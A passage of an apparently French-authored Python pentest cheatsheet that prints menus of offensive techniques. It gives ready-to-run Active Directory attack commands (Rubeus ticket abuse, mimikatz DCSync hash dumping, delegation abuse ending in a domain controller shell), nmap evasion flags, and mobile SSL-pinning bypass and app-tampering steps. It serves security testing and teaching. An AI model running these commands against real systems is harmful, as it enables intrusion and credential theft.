    -> rubeus.exe ptt /ticket:<base64_of_captured_ticket>

# Dump the hashes of the target domain using mimikatz:

    -> mimikatz.exe "lsadump::dcsync /domain:DOMAIN2.FQDNM /user:DOMAIN2\\Administrator" exit

#Constrained Delegation

    -> When a user owns the msDS-AllowedToDelegateTo attribute, we can abuse constrained delegation for the mentioned service and adding alternate services we takeover the object.

    -> rubeus.exe s4u /user:<target_user> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/<target_machine.DOMAIN.FQDN> /altservice:ldap,http,wsman,host,winrm,krbtgt,cifs /ptt

# We can get command execution with Invoke-Command for example

    -> $sess = New-PSSession -computername target_machine.DOMAIN.FQDN
    -> Invoke-Command -session $sess -ScriptBlock {whoami}
    -> Resource-Based Constrained Delegation

    -> If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate a Domain Administrator.

# Use Powermad to create a new machine account

    -> New-MachineAccount -MachineAccount <created_machine> -Password $(ConvertTo-SecureString '<machine_password>' -AsPlainText -Force) -Verbose

# Use PowerView and get the SID value of our new machine

    -> $ComputerSid = Get-DomainComputer <created_machine> -Properties objectsid | Select -Expand objectsid

# Then by using the SID we have to build a ACE for the new created machine account

    -> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
    -> $SDBytes = New-Object byte[] ($SD.BinaryLength)
    -> $SD.GetBinaryForm($SDBytes, 0)

# Set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over

    -> Get-DomainComputer <target_machine> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Use rubeus to get the RC4 hash of the machine account
    
    -> rubeus.exe hash /password:<machine_password>

# Or aes256
    
    -> rubeus.exe hash /password:<machine_password> /domain:DOMAIN.FQDN /user:<created_machine$>

# extract the rc4_hmac/aes256_cts_hmac_sha1 value ==> <rc4_hash>

# Execute the impersonation and get a TGS as Domain Administrator for the service cifs on the DC
    
    -> rubeus.exe s4u /user:<created_machine$> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/<target_machine.DOMAIN.FQDN> /domain:DOMAIN.FQDN /ptt

# Get a session on the DC
    
    -> psexec64.exe -accepteula \\<target_machine.DOMAIN.FQDN> -s powershell.exe

# Optional cleanup
    
    If msds-allowedtoactonbehalfofotheridentity field was empty before

        -> Get-DomainComputer <target_machine> | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
        -> Remove-ADComputer -Identity "<created_machine>"  """)

def liens_utiles_AD():
    print("""Vous avez choisi Liens Utiles. Voici une liste de Tools pour l'AD 
        Tools
Kerbrute
    - Tarlogic : \033[96m[https://github.com/TarlogicSecurity/kerbrute]\033[0m
    - ropnop : \033[96m[https://github.com/ropnop/kerbrute]\033[0m
Responder : \033[96m[https://github.com/lgandx/Responder]\033[0m
Impacket : \033[96m[https://github.com/SecureAuthCorp/impacket]\033[0m
CrackMapExec : \033[96m[https://github.com/byt3bl33d3r/CrackMapExec]\033[0m
PowerSploit : \033[96m[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1]\033[0m
PowerView : \033[96m[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1]\033[0m
Powermad : \033[96m[https://github.com/Kevin-Robertson/Powermad]\033[0m
Weirdhta : \033[96m[https://github.com/felamos/weirdhta]\033[0m
Powercat : \033[96m[https://github.com/besimorhino/powercat]\033[0m
Mimikatz : \033[96m[https://github.com/gentilkiwi/mimikatz]\033[0m
Lsassy : \033[96m[https://github.com/Hackndo/lsassy]\033[0m
Rubeus \033[96m[https://github.com/GhostPack/Rubeus]\033[0m -> Compiled Version : \033[96m[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries]\033[0m
Bloodhound : \033[96m[https://github.com/BloodHoundAD/BloodHound]\033[0m
Ldeep : \033[96m[https://github.com/tiyeuse/ldeep]\033[0m
Ldapdomaindump : \033[96m[https://github.com/dirkjanm/ldapdomaindump]\033[0m
WinPeas \033[96m[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS]\033[0m -> Compiled Version : \033[96m[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases]\033[0m
FullPower : \033[96m[https://github.com/itm4n/FullPowers]\033[0m
PrintSpoofer : \033[96m[https://github.com/itm4n/PrintSpoofer]\033[0m
Potatoes
    - Rotten Potato : \033[96m[https://github.com/breenmachine/RottenPotatoNG]\033[0m
    - Juicy Potato : \033[96m[https://github.com/ohpe/juicy-potato]\033[0m
    - Rogue Potato : \033[96m[https://github.com/antonioCoco/RoguePotato]\033[0m
Enum4linux
    - Old \033[96m[https://github.com/tiyeuse/Active-Directory-Cheatsheet/tree/master/tools/enum4linux]\033[0m
    - Python version : \033[96m[https://github.com/0v3rride/Enum4LinuxPy]\033[0m


Voici également des sources de documentation pertinentes : 
    - \033[96mhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology\033[0m
    - \033[96mhttps://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg\033[0m
    - \033[96mhttps://beta.hackndo.com/\033[0m
    - \033[96mhttps://wadcoms.github.io/\033[0m
""")

# @ Fin Partie Pentest AD @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

# @ Debut Partie Pentest Interne Reseau @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def pentest_interne_reseau():
    print("Vous avez choisi Pentest Interne > Réseau.")
    while True:
        print("\n\033[96m\033[1mMenu Pentest Interne > Réseau:\033[0m")
        print("\033[96m1. Découverte du Réseau & basic attacks\033[0m")
        print("\033[96m2. IDS / IP Evasion\033[0m")
        print("\033[96m3. Retour au menu principal\033[0m")

        choix_interne = input("Choisissez une option (1, 2 ou 3): ")

        if choix_interne == "1":
            decouverte_réseau()
        elif choix_interne == "2":
            ids_ips_evasion()
        elif choix_interne == "3":
            print("Retour au menu principal.")
            break
        else:
            print("Option invalide. Veuillez choisir une option valide.")


def decouverte_réseau():
    print("""bienvenue dans la decouverte réseau
          
    Host / Local Network Discovery

    # Address Resolution Protocol (ARP) Host Discovery 
        -> arpscan --interface eth0 --localnet  # Change the interface if necessary 
        -> netdiscover -r 192.168.X.X # Change the IP if necessary
          
    # Internet Control Message Protocol (ICMP) Ping Scan
        ->   nmap -sn -vv -192.168.X.X/24

    # Nmap TCP Scan
        ->  nmap <IP_RANGE> -Pn # nmap most common ports scan 
            -> add -p- nmap full ports scan  

    # Purposes: 
        -> Identifying protocol and services running on the network
        -> Identifying devices on the network
        -> Finding a lack of encryption
        -> Detecting misconfigurations of the network

        -> On a AD : finding the DC + rights and users permissions                           

          
    # Pentesting WIfi : https://book.hacktricks.xyz/v/fr/generic-methodologies-and-resources/pentesting-wifi 
                
          
          
          
          
          """)

def ids_ips_evasion():
    print("""bienvenue dans les IDS / IP Evasion: https://book.hacktricks.xyz/v/fr/generic-methodologies-and-resources/pentesting-network/ids-evasion

          # Manipulation du TTL 
                -> avec nmap : --ttlvalue <valeur>


          # Eviter les signatures : 
                -> avec nmap : --data-lengh 25 

          # Fragmenter les paquets 
                -> avec nmap : --fragment ou -f 

          #  

          
          
          
          
          
          
          """) 
    
       
 #@ Fin Partie Pentest Interne Reseau @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


#@ Debut Sous Menue Pentest Interne @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def pentest_interne():
    while True:
        print("\n\033[96m\033[1mMenu Pentest Interne:\033[0m")
        print("\033[96m1. Active Directory\033[0m")
        print("\033[96m2. Réseau\033[0m")
        print("\033[96m3. Retour au menu principal\033[0m")

        choix_interne = input("Choisissez une option (1, 2 ou 3): ")

        if choix_interne == "1":
            pentest_interne_ad()
        elif choix_interne == "2":
            pentest_interne_reseau()
        elif choix_interne == "3":
            print("Retour au menu principal.")
            break
        else:
            print("Option invalide. Veuillez choisir une option valide.")

# @ Fin Sous Menue Pentest Interne @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
            
def pentest_externe_web():
    print("""Vous avez choisi Pentest Externe > WEB. Voici quelques tips : 
          
          # Regarder le fichier Robots.txt 

          # Regarder les Headers des réponses HTTP(S) 
            -> Regarder la présence du header HSTS 
                -> # Strict-Transport-Security : 
          
            -> Regarder la présence des Security-Headers : 
                -> #X-Frame-Options : SAMEORIOGIN 
                -> # X-XSS-Protection: 1; mode=block
                -> X-Content-Type-Options : nosniff
          
            -> Regarder la fonction et la structure des cookies
                ->  

            -> Check SSL-Ciphers :
                -> if the app works over HTTPS, check for TLS Secyrity : 
                    -> # nmap --script ssl-enum-ciphers -p 443 <IP>
          

            -> Check the HTTP Methods (99% of the time there is only GET and POST allowed but TRACE, PUT and DELETE can have interresting behaviors for us)
                -> # nmap -p 443 --script http-methods <IP> 

            -> Testing for HEAD access control bypass :
                -> change the GET method with HEAD, sometime it is going to transform 302 to 200 responses.  
           
            -> Try Arbitrary HTTP Methods
          

            -> Test Cross domain Policy :
                -> Test cross domain policy. Add crossdomain.xml to end of base URL of the web page. If you get an xml file inspect the file. If you see <allow-access-from domain=”*” /> in the file, it means something is wrong. You can check OWASP WSTG-CONF-08 for details if you find a page that has the policy.

          
        # Username Enumeration 
            -> sometimes the warning answer is different when the username is valide + the password is not and when username and password are both invalide. Then you can try to enumerate valide username. 


        # Check for weak lock-out policy : 
            -> change of browsers / computers. 

        # Test weak passwords 

        # Test weak security questions 

        # Test password reset functionality
        
        # Test Directory Path Traversal 

        # Test Session Management -> grab sessions ID, are they random ? 

        # Test For CSRF 

        # Test for HTTP Parameter Pollution (HPP)
            -> HTTP protocol does not deal well whith multipe parameters input in the same request for the same parameter. then answers could be different. 
                    ex : search?q=seattle is normal as search?q=boston, but look at the behavior for search?q=seattler&q=boston, if the answer is different there is an HPP. 
          

        # Clickjacking : 


        # File Upload: 

        # CAPCHA 

        # XSS 

        # SQL Injection 

            """)

def pentest_externe_iot():
    print("""Vous avez choisi Pentest Externe > IoT. 

        Voici la liste des vulnérabilité les plus communes sur ce sujet : 

        OWASP IOT TOP 10 

            - Weak or guessable passwords 
            - Insecure network services 
            - Insecure ecosystem interfaces 
            - Lack of secure update mechanism
            - Use of insecure or outdated components 
            - Insufficient privacy protection 
            - Insecure data trasnfer and storage
            - Lack of device management 
            - Insecure default settings 
            - Lack of physical hardeling 

        Les vecteurs d'attaque principaux sont : 

            - Harware
                - Internal communications Protocols like UART, I2C, SPI .... 
                - Open Ports  
                - JTAG debugging
                - Exacting Firmware from EEPROM or FLASH memory
                - Tampering
 
            - Firware
                - Binary analysis
                - Reverse Engineering 
                - Analyzing different file system
                - Sensitive key and certificates
                - Firmware modification 

            - Network

            
            - Wirelkess Communications 
                - Radio Security analysis
                - Exploitation of communication protocols 
                - BLE, Zigbee, LoRA, 6LoWPAN
                - Sniffing radio packets
                - Jamming based attack
                - Modifying and replaying packets 


            - Mobiles and Web Applications 
                - WEb dashboards, XSS, IDOR, Injections 
                - .apk and .IOS source code review 
                - Application reversing 
                - Hardcoded api keys 

            

            - Cloud API’s 
                - Cloud credentials like MQTT, CoAP, AWS .... 


        voici une Check Liste initiale pour ce pentest : 

1) Enumération des services en fonctionnement sur l’appareil, utilisation de nmap -> Enumération de la surface d’attaque. 
    - Un protocole ssh/telnet ? -> recherche des credentials par défauts et les plus commun : bruteforce 
    - SI utilisation d’une technologie Bluetooth : Interception du trafic https://www.iaria.org/conferences2017/filesICIMP17/ICIMP2017_Hacking_BLE_Applications.pdf 

2) Quels sont les protocole d’authentification ? Gesntion de cession ? Est-il possible de les bypass ? 

3) L’appareil utilise-t-il des crédentials par défauts faibles ? 

4) Quel type de serveur web est utilisé ? https://www.rapid7.com/db/modules/auxiliary/scanner/http/goahead_traversal

5) Recherche des vulnérabilités web les plus courantes (Command Injection, LFI, RFI, XSS, CSRF, path traversal, IDOR) https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)

6) Auto-update feature ? -> man in the middle 
    - Préparer un micious fireware et essayer de faire l’update avec 

7) Analyse du firmware : utilisation de binwalk https://s3cur3.it/home/breaking-iot-devices-a-pentesting-checklist
    - Recherche des juicy files (clés privées, MDP en clair, hash etc )
    - Recherche de basic acces authentication, d’un fichier .htpasswd ou de backdoor accound by design. 

 Pour aller plus loin : 

 https://github.com/V33RU/IoTSecurity101



""")

def pentest_externe():
    while True:
        print("\nMenu Pentest Externe:")
        print("1. WEB")
        print("2. IoT")
        print("3. Retour au menu principal")

        choix_externe = input("Choisissez une option (1, 2 ou 3): ")

        if choix_externe == "1":
            pentest_externe_web()
        elif choix_externe == "2":
            pentest_externe_iot()
        elif choix_externe == "3":
            print("Retour au menu principal.")
            break
        else:
            print("Option invalide. Veuillez choisir une option valide.")

#SOUS PARTIE PENTEST MOBILE ################################
def pentest_mobile():
    while True:
        print("\n\033[94m\033[1mMenu Pentest App Mobile :\033[0m")
        print("\033[94m1. App Mobile Généralités\033[0m")
        print("\033[94m2. App Mobile Android\033[0m")
        print("\033[94m3. App Mobile iOS\033[0m")
        print("\033[94m4. Retour au menu précédent\033[0m")

        choix_mobile = input("Choisissez une option (1, 2, 3, ou 4): ")

        if choix_mobile == "1":
            mobile_général() #ecrire cette fonction
            
        elif choix_mobile == "2":
            mobile_android() #ecrire cette fonction
        elif choix_mobile == "3":
            mobile_iOS() #ecrire cette fonction
        elif choix_mobile == "4":
            print("Retour au menu précédent.")
            break
        else:
            print("Option invalide. Veuillez choisir une option valide.")

def mobile_général():
    print("""Voici le processus classique de Pentest d'une App Mobile : sources https://aditya-chauhan17.medium.com/a-mobile-application-penetration-testing-cheat-sheet-is-a-guide-for-penetration-testers-that-7e29394ebd59
               
                1) Information Gathering : Rechercher des informations générales sur l'app : Version, plateforme, fonctionnalité...
                  
                2) Static Analysis : i.e analyse du code source de l'application  à la recherche d'une vulnérabilité. Voici quelques tools utilisables :
                    - AndroGuard : décompile, analyse et Reverse les application Android. 
                    - APK Analyzer : Analyse des applications Android.
                    - Dex2Jar: Conversion de .dex en .jar 
                    - Jadx : Analyse des applications Android après les avoir décompilées. 
                  
                3)  Dynamic Analysis : Analyse de l'application dans un environnement live pour identifier des vulnérabilités -> tools :
                    - Burp Suite : Application très utile en Web mais permet aussi le pentest d'app 
                    - Nuclei : Analyse de l'application dans un environnement live pour identifier des vulnérabilités

                4)  Network Analysis : Analyse du trafic réseau à la recherche d'informations sensibles -> tools : 
                    - Wireshark : Analyse du trafic et des informations sensibles.
                    - TcpDump : comme Wireshark mais en commande line   
                     
                5)  Runtime Analysis : opn observe les comportements de l'application en fonctionnement à la recherche de faiblesses, -> tool : 
                  - Frida :  outils dynamique d'analyse des comportements de l'application en environement live. 
                  - AppMon: 
                  -Xposed : tool qui cherche à modifier le comportement d'une application. 
            """) # a completer

def mobile_android():
    print(""" Rédiger à partir des travaux de RandoriSec

                - Main Steps : 
                        -> Review the Codebase 
                           -> Static Analysis 
                        -> Run the App 
                        -> Dynamic Instrumentation 
                        -> Analyze network Communication                            

                - Tools : 
                        -> Frida 
                        -> Objection
                        -> JADX
                        -> apktool
                        -> BurpSuite

            # Analyse de la structure de l'APK 
                ->  META-INF 
                        § Files related to the signature scheme (v1 scheme only)     

                ->  lib
                        § Folder containing native libraries (ARM, MIPS, x86, x64)                                                 

                -> assets 
                        § Folder containing application specific files

                ->  res
                        § Folder containing all the resources (layouts, strings, etc.) of the app

                -> classes.dex [classes2.dex] …
                        § Dalvik bytecode of the app

                -> AndroidManifest.xml
                        § Manifest describing essential information about the app (permissions, components, etc.)                      


            # Observer le Package Name : c'est l'unique moyen d'idenfifier une app : par exemple pour Youtube :  com.google.android.youtube   


            # Observer le Data Storage : 
                -> User APplications : # /data/data/<package-name>/ 

                -> Shared Preferences Files : # /data/data/<package-name>/shared_prefs

                -> SQLite Database Files : # /data/data/<package-name>/databases 
                                                                                                             
                -> Internal Storage : # /data/data/<package-name>/files 
                           
                -> External Storage : # /storage/emulated/0/Android/data/<package-name>/files

                -> Cache Storage : # /data/data/<package-name>/cache

                -> External Cache Storage : # /storage/emulated/0/Android/data/<package-name>/cache


            # Package Manager : 
                -> List all packages installed on the device : # adb shell pm list packages

                -> Find the path where the apk is stored for the selected package : # adb shell pm path <package-name>

                -> List only installed apps (not system apps) and the associated path : # adb shell pm list packages -3 -f 

                -> List packages having the specified pattern : # adb shell pm list packages -f <pattern>


            # Application Signing :

                -> One line to create your own keystore : 
                           # keytool -genkeypair -dname "cn=John Doe, ou=Security, o=Randorisec, c=FR" -alias <alias_name> -keystore <keystore_name> -storepass <keystore_password> -validity<days> -keyalg RSA -keysize 2048 -sigalg SHA1withRSA                                                                                                                                                    
                        
                -> Signing with apksigner (Offical tool from android SDK which supports all signature schemes) : 
                           #  # apksigner sign --ks <keystore_name> --ks-pass pass:<keystore_password> <APK_file> 
         
            # Code Tampering : 
                ->  1. Disassemble and save the smali code into output directory
                            # apktool d <APK_file> -o <directory_output>

                ->  2. Modify the app (smali code or resource files)

                ->  3. Build the modified APK
                            # apktool b <directory_output> -o <APK_file>  

                ->  4. Sign the APK (see Application Signing) 

                ->  5. (Optional) Uses zipalign to provide optimization to the Android APK
                            # zipalign -fv 4 <input_APK> <output_APK                   

                           
            # Content Provider : 
                -> Query a content provider : Query a Content Provider
                            # adb shell content query --uri content://<provider_authority_name>/<table_name>               

                -> Insert an element on a Content Provider 
                            # adb shell content insert --uri content://<provider_authority_name>/<table_name> --bind <param_name>:<param_type>:<param_value>

                -> Delete a row on a Content Provider
                            # adb shell content delete --uri content://<provider_authority_name>/<table_name> --where “<param_name>=‘<param_value>’”           


            # Activity Manager : 
                -> Start an Activity with the specified Intent
                            # adb shell am start -n <package_name/activity_name> -a <intent_action>

                -> Start an Activity with the specified Intent and extra parameters
                            # adb shell am start -n <package_name/activity_name> -a <intent_action> --es <param_name> <string_value> --ez <param_name> <boolean_value> --ei <param_name> <int_value>           

            
            # SSL/TLS Interception with BurpSuite - Before Android 7               
                1. Launch Burp and modify Proxy settings in order to listen on “All interfaces” (or a specific interface)
                
                2. Edit the Wireless network settings in your device or the emulator proxy settings
                
    
                3. Export the CA certificate from Burp and save it with “.cer” extension
                
                4. Push the exported certificate on the device with adb (into the SD card)
                
                5. Go to “Settings->Security” and select “Install from device storage”
                
                6. Select for “Credentials use” select “VPN and apps           

                           
            # SSL/TLS Interception with BurpSuite - After Android 7
                1. Install BurpSuite certificate on your device (see Before Android 7)
                           
                2. Disassemble the APK with apktool
                           
                3. Tamper the network_security_config.xml file by replacing the <pin-set> tag by the following
                    <trust-anchors>
                        <certificates src="system" />
                        <certificates src="user" />
                    </trust-anchors>
                           
                4. Build and sign the APK (see Code Tampering)
                                                        
                           
            # Inject Frida Gadget using Objection (non rooted device)
                -> objection patchapk --source <APK_file> -V <frida_version> --architecture <arch>                         
                           

            # Inject Frida Gadget (non rooted device)
                Steps to inject the Frida Gadget library inside an app:
                           
                1. Disassemble the app with apktool (see Code Tampering)
                           
                2. Add the lib-gadget library (https://github.com/frida/frida/releases) inside the app (lib folder)
                           
                3. Modify the smali code to load the lib-gadget (usually on the Main Activity
                           
                    const-string v0, "frida-gadget"
                    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

                4. Add the INTERNET permission on the AndroidManifest.xml

                5. Rebuild the app with apktool and sign it (see Code Tampering and Application Signing)

                6. Inject Frida Gadget using Objection
                           



        
            # Decompile APK and DEX files 

                -> Decompile using the JADX GUI: # jadx-gui <APK_file | dex_file>               
        
                -> Decompile using the JADX command line (another IDE can be used to analyze the source code):
                           # jadx -d <directory_output> <APK_file | dex_file>                    
                                          
            
            # ADB 
                -> Connect through USB 
                    # adb -d shell
                
                -> Connect though TCP/IP
                    # adb -e shell
          
                -> Get a shell or execute the command
                    # adb shell [cmd]
          
                -> List processes
                    # adb shell ps
          
                -> List Android devices connected
                    # adb devices    
                
                -> Dump the log messages from Android
                    # adb logcat    
          
                -> Copy local file to device
                    # adb push <local> <device> 
          
                -> Copy file from device
                    # adb pull <remote> <local>
          
                -> Install APK on the device
                    # adb install <APK_file>
          
                -> Install an App Bundle 
                    # adb install-multiple <APK_file_1> <APK_file_2> [APK_file_3] … 
          
                -> Set-up port forwarding using TCP from host to Android device
                    # adb forward tcp:<local_port> tcp:<remote_port>
          
          
            # Frida – Installation
                -> Install Frida on your system with Python bindings
                    # pip install frida frida-tools

                -> Download the Frida server binary (check your architecture): https://github.com/frida/frida/releases)
                    # VER=`frida --version`
                    # ABI=`adb shell getprop ro.product.cpu.abi`
                    # wget https://github.com/frida/frida/releases/download/$VER/frida-server-$VER-android-$ABI.xz
                    # xz -d frida-server-$VER-android-$ABI.xz
          
                -> Upload and execute the Frida server binary (adb service should run with root privileges)
                    # adb root
                    # adb push frida-server-$VER-android-$ABI /data/local/tmp/frida
                    # adb shell “chmod 755 /data/local/tmp/frida” 
                    # adb shell “/data/local/tmp/frida”

            Frida – Tools
                ->  List running processes (emulators or devices connected through USB)
                    # frida-ps -U  

                -> List only installed applications
                    # frida-ps -U -i

                -> Attach Frida to the specified application
                    # frida -U <package_name>

                -> Spawn the specified application without any pause
                    # frida -U -f <package_name> --no-pause
          
                -> Load a script
                    # frida -U -l <script_file> <package_name>

                  """)

def mobile_iOS():
    print("""Sous menu Pentest mobile iOS : lien vers le site de hacktricks, et check list :
      credits : Randorisec


          MAIN STEPS :
            -> Review the codebase
            -> Run the app
            -> Dynamic Instrumentation 
            -> Analyse network communication 
        
          MAIN TOOLS :
            -> Frida
            -> Objection 
            -> Impactor 
            -> BurpSuite
            -> WireShark 
            -> Fsmon 
          


        
          # Analyse Filesystem 
             
                # /User/library/FrontBoard/applicationState.db
                    -> App list database
                
                # /private/var/containers/Bindle/Application/UUID/app.app 
                    -> Binary directory: include all the static resources of the app
          
                # /private/var/containers/Bundle/Application/UUID/App.app/App
                    -> Path of the binary (executable)
          
                # /private/var/containers/Bundle/Application/UUID/App.app/Info.plist
                    -> App metadata: configuration of the app (icon to display, supported document types, etc.)
          
                # /private/var/mobile/Containers/Data/Application/Data-UUID
                    -> Data Directory 
          
          NB: UUID (Universally Unique Identifier): random 36 alphanumeric characters string unique to the app
              Data-UUID: random 36 alphanumeric characters string unique to the app
          


          # Bundle ID
                The bundle ID represents the app’s unique identifier (e.g. for YouTube): com.google.ios.youtube
          
          # How to find the data and binary directories
                Grep is the quick ‘n dirty way to find where are the data and binary directories of your app iPhone: 
                     ->  ~ root# grep -r <App_name> /private/var/*

        
          
          # How to find the data and binary directories and the Bundle ID

                # By Lauching Frida with the ios-app-info script:
                    -> frida -U <App_name> -c dki/ios-app-info

                # and then : 
                    -> [iPhone::App]-> appInfo()
          
                # Or manually by opening the app list database
                    -> iPhone:~ root# sqlite3 /User/Library/FrontBoard/applicationState.db
        
                # And displaying the key_tab table to get the binary directories
                    -> sqlite> select * from key_tab;
          
                # Or displaying the application_identifier_tab table to get the bundle IDs
                    -> sqlite> select * from application_identifier_tab;

          # Monitor filesystem access

                # Fsmon (https://github.com/nowsecure/fsmon) let you monitor which files are accessed
                    -> iPhone: ~ root# fsmon-ios -P <App_name>
          
          # App decryption
                1. Add https://level3tjg.me/repo source to Cydia and install bfdecrypt tool
                2. Go to bfdecrypt pref pane in Settings and set the app to decrypt
                3. Launch the app to decrypt: decrypted IPA is stored in the Documents folder of the app          

          

          # Dynamic analysis with Frida
            
                    # List all processes
                        -> frida-ps –U

                    # Analyse the calls to a method by launching Frida with the objc-method-observer script
                        -> frida -U <App_name> –c mrmacete/objc-method-observer

                    # And then using the command ‘observeSomething’
                        -> [iPhone::App]-> observeSomething('*[* *<Method_name>*]’);

                    # Hook the calls to the method <Method_name>
                        -> frida-trace -U <App_name> -m "-[* <Method_name>*]"

                    # Then open the JavaScript handler file to edit the onEnter or onLeave functions to manipulate the behavior of the app

          

          # Dynamic analysis with Objection

                    # Inject objection 
                        -> objection -g "<App_name>" explore     

                    # List the classes (output will contain thousands of lines)
                        -> ios hooking list classes 
          
                    # list the methods of a class 
                        -> ios hooking list class_method <Class_name>
          
                    # Search for classes|methods containing <Strings>
                        -> ios hooking search classes|methods <Strings>
          
                    # Analyse the calls to the method <Method_name>
                        -> ios hooking watch method "-[<Class_name> <Method_name>]"
          
                    # Hook the <Method_name> and return true to each call
                        -> ios hooking set return_value "-[<Class_name> <Method_name>]" true

          
          # Get the NSLog (syslog)
                    
                    # Impactor (http://www.cydiaimpactor.com) let you display the NSLog (syslog) on command line
                        -> ./Impactor idevicesyslog -u <UDID>


          
          # SSL Interception with BurpSuite
                    1. Launch Burp and modify proxy settings in order to listen on “All interfaces”
                    2. Browse to the IP/port of your Burp proxy using Safari
                    3. Tap on the “CA Certificate” at the top right of the screen
                    4. Tap on “Allow” on the pop-up asking to download a configuration profile
                    5. Go to “Settings->Profile Downloaded” and select the “PortSwigger CA” profile
                    6. Tap on “Install” then “Install” again and then “Install” one last time
                    7. Edit the wireless network settings on your device to set a proxy (“Settings->Wi-Fi” then tap on the blue “i”, slide to the bottom of the screen and tap on “Configure Proxy”)
                    8. Tap on ”Manual”, set the IP/port of your Burp proxy, tap on “Save”
                    9. Go to “Settings->General->About->Certificate Trust Settings” & toggle on the PortSwiggerCA

          

          # Bypass SSL Pinning using SSL Kill Switch 2

                    # Download and install SSL Kill Switch 2 tweak
                        ->  wget https://github.com/nabla-c0d3/ssl-kill-switch2/releases/download/0.14/com.nablac0d3.sslkillswitch2_0.14.deb
                        -> dpkg -i com.nablac0d3.sslkillswitch2_0.14.deb
                        -> killall -HUP SpringBoard
                    # Go to “Settings->SSL Kill Switch 2” to ”Disable Certificate Validation”


          # Get the UDID (Unique Device Identifier)

          
                    # UDID is a string that is used to identify a device. Needed for some operations like signature, app installation, network monitoring
        
                        # Get UDID with MacOS
                            -> idevice_id -l

                        # Get UDID with Linux
                            -> usbfluxctl list


          

          # Network capture (works also on non jailbroken devices) 

                    # MacOS (install Xcode and additional tools and connect the device with USB)
                        -> rvictl -s <UDID>
                        -> tcpdump or tshark or wireshark –i rvi0

                    # Linux (get https://github.com/gh2o/rvi_capture and connect the device with USB)
                        -> ./rvi_capture.py --udid <UDID> iPhone.pcap
          

          

          # Sideloading an app with IPAPatch

                   # Sideloading an app including an instrumentation library like Frida let you interact with the app even if it’s installed on a non jailbroken device.

                            1. Clone the IPAPatch project
                                -> git clone https://github.com/Naituw/IPAPatch
                            
                            2. Move the IPA of the app you want to sideload to the Assets directory
                                -> mv <IPAfile> IPAPatch/Assets/

                            3. Download the FridaGadget library (in Assets/Dylibs/FridaGadget.dylib)
                                -> curl -O https://build.frida.re/frida/ios/lib/FridaGadget.dylib
          
                            4. Select the identity to sign the app
                                -> security find-identity -p codesigning –v

                            5. Sign FridaGadget library
                                -> codesign -f -s <IDENTITY> FridaGadget.dylib

                            6. Then open IPAPatch Xcode project, Build and Run.


          # Sideloading an app with Objection 
                    
                 # (detailed steps on https://github.com/sensepost/objection/wiki/Patching-iOS-Applications)

                        -> security find-identity -p codesigning –v
                        -> objection patchipa --source <IPAfile> --codesign-signature <IDENTITY>
                        -> unzip <patchedIPAfile>
                        -> ios-deploy --bundle Payload/my-app.app -W –d
                        -> objection explore

                  

          # Data Protection Class

                # Four levels are provided by iOS to encrypt automatically files on the device:
                    1. NSProtectionComplete: file is only accessible when device is unlocked (files are encrypted with a key derived from the user PIN code & an AES key generated by the device)
                    2. NSProtectionCompleteUntilFirstUserAuthentication: (defaut class) same except as before, but the decryption key is not deleted when the device is locked
                    3. ProtectedUnlessOpen: file is accessible until open
                    4. NoProtection: file is accessible even if device is locked



          
          # Get Data Protection Class
                # By launching Frida with the ios-dataprotection script
                    -> frida -U <App_name> -c ay-kay/ios-dataprotection

           """)

#FIN SOUS PARTIE PENTEST MOBILE #####################################

# FONCTION MAIN #################################################
while True:
    print("""\033[92mCheatSheet developpée par B@b1gr00t, version 1.0\033[0m
        First of all,  this the the HackTricks website\033[96mhttps://book.hacktricks.xyz/welcome/readme\033[0m this is one of the greatest sources of informations.
          
          thx to Hack the Box, Pixis, Tiyeuse, OCD, Randorisec and others for there works that helped me to develop this cheatsheet. """)
    print("\n\033[92m\033[1mMenu Pentest:\033[0m")
    print("\033[92m1. Internal Pentest\033[0m")
    print("\033[92m2. External Pentest\033[0m")
    print("\033[92m3. Pentest Mobile\033[0m")
    print("\033[92m4. Quit\033[0m")

    choix = input("Pick an option (1, 2, 3 ou 4): ")

    if choix == "1":
        pentest_interne()
    elif choix == "2":
        pentest_externe()
    elif choix == "3":
        pentest_mobile()
    elif choix == "4":
        print("END.")
        break
    else:
        print("Invalid option. Please choose a valid option.")
